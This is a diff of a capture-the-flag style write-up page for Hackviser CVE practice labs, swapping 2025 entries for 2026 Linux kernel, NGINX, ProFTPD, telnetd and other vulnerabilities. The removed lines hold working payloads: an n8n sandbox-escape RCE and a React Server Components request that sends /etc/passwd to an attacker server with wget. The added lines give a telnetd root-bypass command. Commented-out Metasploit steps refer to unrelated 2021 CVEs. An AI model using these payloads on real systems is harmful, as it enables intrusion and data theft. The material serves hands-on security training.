@@ -2,43 +2,42 @@
 title: 'CVE 2026'
 date: '2026-05-04'
 excerpt: 'CVE-2026-43284 & CVE-2026-43500, CVE-2026-42945, CVE-2026-31431, CVE-2026-42167, CVE-2026-29058, CVE-2026-2329, CVE-2026-1357, CVE-2026-24061'
-prog: 'Hackviser CVE Labs  -  May 2026'
+prog: 'Hackviser CVE Labs  -  June 2026'
 ---
 
 <div class="writeup-header">
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_hackviser_logo.webp" alt="Hackviser logo" class="writeup-logo" />
 <div class="writeup-header-text">
 <div class="writeup-org">Hackviser</div>
-<h1 class="writeup-title">CVE 2025</h1>
-<div class="writeup-date">May 2026 · CVE Labs</div>
+<h1 class="writeup-title">CVE 2026</h1>
+<div class="writeup-date">June 2026 · CVE Labs</div>
 </div>
 </div>
 <p class="lead mb-4">Practice Common Vulnerabilities and Exposures Labs</p>
 
-<h4 class="mb-2"><strong>1. n8n Remote Code Execution (CVE-2025-68613)</strong></h4>
-<p class="mb-3">n8n is a source-available, open-source workflow automation tool that enables users to connect applications, APIs, and data sources through a visual, node-based interface to automate tasks without deep coding knowledge. It is widely used for integrating disparate services and creating complex logic flows. This laboratory contains the CVE-2025-68613 vulnerability identified in n8n versions starting from 0.211.0 and prior to 1.120.4, 1.121.1, and 1.122.0. This critical vulnerability allows an authenticated attacker to escape the sandbox environment used for expression evaluation. Under certain conditions, malicious JavaScript expressions injected by users with workflow editing permissions are evaluated in a context that allows access to global Node.js objects. This flaw leads to Remote Code Execution (RCE) on the server with the privileges of the n8n process. 
+<h4 class="mb-2"><strong>1. Dirty Frag – Linux Kernel Local Privilege Escalation (CVE-2026-43284 & CVE-2026-43500)</strong></h4>
+<p class="mb-3">Dirty Frag is a Linux kernel local privilege escalation vulnerability chain that allows a low-privileged local user to gain root access by abusing page cache write behavior in kernel networking components.
+
+This laboratory demonstrates the Dirty Frag vulnerability chain, tracked as CVE-2026-43284 and CVE-2026-43500. Dirty Frag belongs to the same bug class as Dirty Pipe and Copy Fail, but instead of targeting pipe buffers or the <code>algif_aead</code> interface directly, it abuses the frag member of <code>struct sk_buff</code> in Linux kernel networking paths.
+
+The chain combines two page-cache write primitives: <code>xfrm-ESP</code> Page-Cache Write and <code>RxRPC</code> Page-Cache Write. By using zero-copy mechanisms such as <code>splice()</code>, an attacker can place a reference to a read-only file's page cache into a network packet buffer. The kernel then performs in-place crypto operations on that externally backed memory page. As a result, files that an unprivileged user can only read, such as <code>/usr/bin/su</code> or <code>/etc/passwd</code>, can be modified in RAM through the page cache without changing the original file on disk.
+
+The highest CVSS score in this vulnerability chain is 8.8. In a successful exploitation scenario, a local attacker can temporarily modify the cached memory of a setuid-root binary and execute it to obtain a root shell.
+
+Vulnerability Scope:
 <br />
-Exploitation Steps: To exploit this vulnerability, you must first log in using the provided credentials and create a workflow. Add an "Edit Fields" (or Set) node, switch a parameter to Expression mode, and use the following payloads:
+- CVE-2026-43284: Affects the <code>xfrm-ESP</code> path. According to the original Dirty Frag write-up, this issue is in scope from Linux kernel commit <code>cac2661c53f3</code> dated 2017-01-17 up to the mainline fix commit <code>f4c50a4034e6</code> dated 2026-05-05. <br />
+- CVE-2026-43500: Affects the <code>RxRPC</code> path. According to the original Dirty Frag write-up, this issue is in scope from Linux kernel commit <code>2dc334f1a63a</code> dated 2023-06-08 up to the mainline fix commit <code>aa54b1d27fe0</code> dated 2026-05-10. <br />
+- Affected Kernel Ranges: NVD lists vulnerable Linux kernel ranges for CVE-2026-43284 including 4.11 to before 5.10.255, 5.12 to before 5.15.205, 5.16 to before 6.1.171, 6.2 to before 6.6.138, 6.7 to before 6.12.87, 6.13 to before 6.18.28, and 7.0 to before 7.0.5. <br />
+- RxRPC Affected Ranges: NVD lists vulnerable Linux kernel ranges for CVE-2026-43500 from after 5.3 to before 6.18.29, and from 6.19 to before 7.0.6, including early 7.1-rc releases. </p>
+<p class="mb-3">
+Using the low-privilege credentials, you must connect to the machine over SSH and escalate to root.
 <br />
-<strong>1. Reconnaissance: Dump Environment Variables</strong><br />
-Check if you can access the process environment to see sensitive keys.</p>
-
-```javascript
-{{ (function(){ return this.process.env; })() }}
-```
-<p class="mb-3"><strong>
-2. Verification: Remote Code Execution (RCE)</strong><br />
-Verify remote code execution by running the id command.</p>
-
-```javascript
-{{ (function() {
- var require = this.process.mainModule.require;
- var execSync = require('child_process').execSync;
- return execSync('id').toString();
-})() }}
-```
-
-<p class="mb-3">Credentials: HTTP Port: <code>5678</code>, Username: <code>admin@local.hv</code>, Password: <code>Password1337!</code> <br />Exploit the vulnerability to read the /secret.txt file on the server. What is the secret content?</p>
+SSH username: <code>guest</code>
+<br />
+SSH password: <code>guest</code>
+<br />
+What is the secret inside the <code>/root/secret.txt</code> file?</p>
 <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-44228</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
 <!-- <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-44228/cvelabs_cve-2021-44228_image1.png" alt="CVE-2021-44228 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
 <p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. Apparently an error in exploit execution occured.</p>
@@ -48,28 +47,12 @@ Verify remote code execution by running the id command.</p>
 <p class="mb-5"><strong>Answer:</strong> </p>
 <br />
 
-<h4 class="mb-2">2. React Server Components Remote Code Execution (CVE-2025-55182)</h4>
-<p class="mb-3">This laboratory demonstrates a critical vulnerability identified as CVE-2025-55182 (tracked as CVE-2025-66478 for Next.js). The flaw exists in the "Flight" protocol implementation used by RSC. Due to unsafe deserialization of payloads sent to Server Function endpoints, an unauthenticated attacker can execute arbitrary code on the server (RCE). This vulnerability has a critical severity score of CVSS 10.0. The vulnerability affects the following specific versions: React: Versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 and Next.js: Versions 15.x, 16.x, and Canary releases starting from v14.3.0-canary.77. The following Proof of Concept (PoC) payload exploits prototype pollution to trigger Remote Code Execution (RCE) and exfiltrates target data via an Out-of-Band (OOB) channel. The wget command within the payload reads the /secret.txt file and sends its content to the attacker's listener.</p>
+<h4 class="mb-2">2. NGINX Rewrite Module RCE via Heap Buffer Overflow (CVE-2026-42945)</h4>
+<p class="mb-3">NGINX is a widely used open-source web server, reverse proxy, load balancer, and HTTP cache commonly deployed in front of web applications and infrastructure services. This laboratory contains the CVE-2026-42945 vulnerability affecting NGINX Open Source and NGINX Plus under specific rewrite configuration conditions. The vulnerability is rated Critical with a CVSS score of 9.2. The flaw exists in the <code>ngx_http_rewrite_module</code> when a <code>rewrite</code> directive is followed by another <code>rewrite</code>, <code>if</code>, or <code>set</code> directive, uses an unnamed PCRE capture such as <code>$1</code> or <code>$2</code>, and includes a question mark (<code>?</code>) in the replacement string. An unauthenticated attacker can send crafted HTTP requests that trigger a heap buffer overflow in the NGINX worker process.
 
-```http
-POST / HTTP/1.1
-Host: TARGET
-User-Agent: Mozilla/5.0
-Next-Action: x
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
-Content-Length: 503
+In normal environments, successful exploitation may cause the worker process to crash or restart, resulting in denial of service. In environments where ASLR is disabled or predictable, code execution may also be possible.</p>
 
-------WebKitFormBoundary7MA4YWxkTrZu0gW
-Content-Disposition: form-data; name="0"
-
-{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('child_process').exec('wget --post-file=/etc/passwd http://ATTACKER_SERVER');","_formData":{"get":"$1:constructor:constructor"}}}
-------WebKitFormBoundary7MA4YWxkTrZu0gW
-Content-Disposition: form-data; name="1"
-
-"$@0"
-------WebKitFormBoundary7MA4YWxkTrZu0gW--
-```
-<p class="mb-3">Note: The target machine has no internet access (air-gapped). You must set up a local listener (HTTP/POST) and direct the OOB request to your local IP address. Exploit the vulnerability to read the /secret.txt file on the server. What is the secret content?</p>
+<p class="mb-3">What is the secret in the <code>/secret.txt</code> file?</p>
 <!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-3129</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-3129/cvelabs_cve-2021-3129_image1.png" alt="CVE-2021-3129 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
 <p class="mb-3">Enter <code>set RHOSTS [target_IP]</code> and <code>set LHOST [local_IP]</code>. Then run <code>exploit</code> once ready. A Command shell session will open and we simply run <code>cat /secret.txt</code> to obtain the secret information.</p>
@@ -77,8 +60,22 @@ Content-Disposition: form-data; name="1"
 <p class="mb-5"><strong>Answer:</strong> </p>
 <br />
 
-<h4 class="mb-2">3. Apache Tomcat 9.0.0-9.0.98/10.1.0-10.1.34/11.0.0-11.0.2 Remote Code Execution (CVE-2025-24813)</h4>
-<p class="mb-3">Apache Tomcat is an open-source web server and servlet container used to run Java-based web applications. This laboratory contains the CVE-2025-24813 vulnerability identified in Apache Tomcat versions 9.0.0-9.0.98, 10.1.0-10.1.34, and 11.0.0-11.0.2. This critical vulnerability arises from improper handling of partial PUT requests and flaws in the path equivalence mechanism. When write permissions are enabled on the default servlet and file-based session persistence is configured, the vulnerability allows attackers to perform remote code execution on the server. Attackers can upload JSP web shell files in chunks using the Content-Range header and execute arbitrary Java code through the session deserialization mechanism. What is the secret in the /secret.txt file?</p>
+<h4 class="mb-2">3. Copy Fail – Linux Kernel Local Privilege Escalation (CVE-2026-31431)</h4>
+<p class="mb-3">This laboratory demonstrates a high-severity vulnerability identified as Copy Fail (CVE-2026-31431). The flaw is a direct logic error in the Linux kernel's <code>algif_aead</code> interface, introduced in 2017 via commit <code>72548b093ee3</code>. The <code>authencesn</code> algorithm uses a 4-byte area as scratch space during processing; due to this vulnerability, these 4 bytes are written directly into the page cache (the in-memory copy) of the target file. By chaining <code>AF_ALG</code> sockets with the <code>splice()</code> system call, an unprivileged local user can trick the kernel into performing this 4-controlled-byte write into the read-only memory of setuid binaries (such as <code>/usr/bin/su</code>), gaining root access within seconds without modifying the physical file on disk.
+<br />
+Vulnerability Scope:
+- Vulnerable: Linux kernel 4.14 through 7.0-rc (essentially all mainstream kernels compiled between 2017 and April 2026). This includes all 6.18.x versions prior to 6.18.22 and 6.19.x prior to 6.19.12.
+- Fixed: Versions 7.0, 6.19.12, and 6.18.22.
+- Downstream LTS Exposure: Older LTS lines such as 6.12.x, 6.6.x, 5.15.x, and 5.10.x remain vulnerable unless specifically patched after April 2026.</p>
+<p class="mb-3">
+Using the low-privilege credentials, you must connect to the machine over SSH and escalate to root. (Because the box has no internet access, exploit files cannot be downloaded from the web; instead, transfer them via a local HTTP server over HackerBox/VPN, or use copy-and-paste.)
+<br />
+SSH username: <code>guest</code>
+<br />
+SSH password: <code>guest</code>
+<br />
+What is the secret inside the <code>/root/secret.txt</code> file?
+</p>
 <!-- <p class="mb-3"><strong>Steps: </strong>First we need to perform a simple Nmap scan to identify which ports are open on the target machine.</p>
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-42013/cvelabs_cve-2021-42013_image1.png" alt="CVE-2021-42013 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
 <p class="mb-3">Then we use Metasploit via <code>msfconsole</code>. Run <code>search CVE-2021-42013</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
@@ -88,8 +85,83 @@ Content-Disposition: form-data; name="1"
 <p class="mb-5"><strong>Answer:</strong> </p>
 <br />
 
-<h4 class="mb-2">4. Apache HugeGraph Gremlin Remote Code Execution (CVE-2024-27348)</h4>
-<p class="mb-3">Apache HugeGraph is a popular open-source graph database designed for managing and analyzing large-scale data with high performance. It supports the Gremlin query language for complex graph traversals. This laboratory features the critical CVE-2024-27348 vulnerability found in Apache HugeGraph Server versions prior to 1.3.0. The vulnerability exists in the Gremlin query execution engine, where sandbox restrictions can be bypassed. An unauthenticated remote attacker can send specially crafted Gremlin queries via the REST API to execute arbitrary Java code on the server (RCE). This allows the attacker to take full control of the database server. Note: Ensure that the payload selected during exploitation matches the target system architecture (x64). Exploit the vulnerability to read the /secret.txt file inside the server. What is the secret information inside?</p>
+<h4 class="mb-2">4. ProFTPD Authentication Bypass & Remote Code Execution (CVE-2026-42167)</h4>
+<p class="mb-3">ProFTPD is a highly configurable open-source FTP server.
+
+In versions prior to 1.3.9 using the <code>mod_sql</code> module, a critical logical vulnerability (CVE-2026-42167) exists in the <code>is_escaped_text()</code> function. The flaw allows attackers to bypass SQL character escaping by providing inputs that start and end with a single quote. This can lead to unauthenticated authentication bypass or, when combined with a PostgreSQL backend, stacked query injection to achieve Remote Code Execution (RCE) via the <code>COPY FROM PROGRAM</code> directive.
+
+Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside the file?</p>
+<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
+<p class="mb-5"><strong>Answer:</strong> </p>
+<br />
+
+<h4 class="mb-2">5. AVideo Encoder getImage.php Command Injection (CVE-2026-29058)</h4>
+<p class="mb-3">AVideo is an open-source video-sharing platform solution.
+
+In versions of AVideo Encoder prior to 7.0, there is an unauthenticated OS Command Injection vulnerability (CVE-2026-29058) caused by the improper sanitization of the <code>base64Url</code> GET parameter located in the <code>objects/getImage.php</code> endpoint. This vulnerability allows attackers to directly execute injected shell commands on the server.
+
+Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside the file?</p>
+<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
+<p class="mb-5"><strong>Answer:</strong> </p>
+<br />
+
+<h4 class="mb-2">6. Grandstream GXP1600 Unauthenticated Remote Code Execution (CVE-2026-2329)</h4>
+<p class="mb-3">The Grandstream GXP1600 series is a widely used VoIP (Voice over IP) desktop phone solution designed for businesses and small offices to handle voice communications.
+
+The web management interface of these devices contains a critical stack-based buffer overflow vulnerability in the <code>/cgi-bin/api.values.get</code> endpoint that does not require authentication. Attackers can exploit this vulnerability to execute arbitrary code remotely (RCE) with root privileges on the device.
+
+Exploit the vulnerability to read the <code>/secret.txt</code> file on the server. What is the hidden information inside the file?</p>
+<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
+<p class="mb-5"><strong>Answer:</strong> </p>
+<br />
+
+<h4 class="mb-2">7. WPvivid Backup & Migration Plugin Unauthenticated Remote Code Execution (CVE-2026-1357)</h4>
+<p class="mb-3">WPvivid Backup & Migration is a popular WordPress plugin used for backups, restorations, and site migrations.
+
+This laboratory covers a critical vulnerability found in versions <= 0.9.123. The issue resides in the "Auto-Migration" functionality, which fails to properly validate incoming requests when the migration endpoint is active. Unauthenticated attackers can bypass authentication, use path traversal to upload arbitrary PHP files, and execute system commands.
+
+Exploit the vulnerability to read the <code>/secret.txt</code> file inside the server. What is the secret information inside?</p>
+<!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image2.png" alt="CVE-2021-43798 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Once we read the download file from the target machine, we obtain the secret information.</p>
+<img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
+<p class="mb-5"><strong>Answer:</strong> </p>
+<br />
+
+<h4 class="mb-2">8. GNU Inetutils Telnetd Authentication Bypass (CVE-2026-24061)</h4>
+<p class="mb-3">GNU Inetutils <code>telnetd</code> is a widely used daemon that provides remote command-line access.
+
+This laboratory contains the CVE-2026-24061 vulnerability, affecting GNU Inetutils versions prior to 2.4. This is a critical Argument Injection flaw. The daemon improperly passes the <code>USER</code> environment variable (supplied by the client) to the <code>/bin/login</code> binary without sanitization.
+
+To exploit this, we manipulate the <code>USER</code> variable to inject arguments:
+
+- <code>-f root</code> (Force Flag): This injected payload is passed to <code>/bin/login</code>. It instructs the system to force the login for the "root" user, effectively bypassing the authentication (password) check completely.
+- <code>-a</code> (Auto Login): This flag forces the telnet client to send the local environment variables (including our malicious <code>USER</code> variable) to the server during the initial handshake.
+Run the following command in your terminal:
+</p>
+
+```bash
+USER='-f root' telnet -a <TARGET_IP>
+```
+
+<p class="mb-3">Exploit the vulnerability to gain root access. Read the <code>/secret.txt</code> file. What is the secret content?</p>
 <!-- <p class="mb-3"><strong>Steps: </strong>We directly use Metasploit via <code>msfconsole</code>. Then run <code>search CVE-2021-43798</code>, <code>use 0</code> and <code>show options</code> to view what option parameters need to be set.</p>
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image1.png" alt="CVE-2021-43798 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
 <p class="mb-3">Enter <code>set FILEPATH /secret.txt</code> and <code>set RHOSTS [target_IP]</code>. Then run <code>exploit</code> once ready. The exploit will download the targeted file and save it in the given directory path.</p>
@@ -98,11 +170,12 @@ Content-Disposition: form-data; name="1"
 <img src="/assets/hackinglabs/hackviser/cvelabs/cve_2021/cve-2021-43798/cvelabs_cve-2021-43798_image3.png" alt="CVE-2021-43798 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" /> -->
 <p class="mb-5"><strong>Answer:</strong> </p>
 
+
 <hr />
 <section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
 <p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
 <p class="mb-0" style="font-weight:700;">@aaronamran</p>
-<p class="text-muted small mt-1">May 2026</p>
+<p class="text-muted small mt-1">June 2026</p>
 </section>
 
 <div class="writeup-nav">
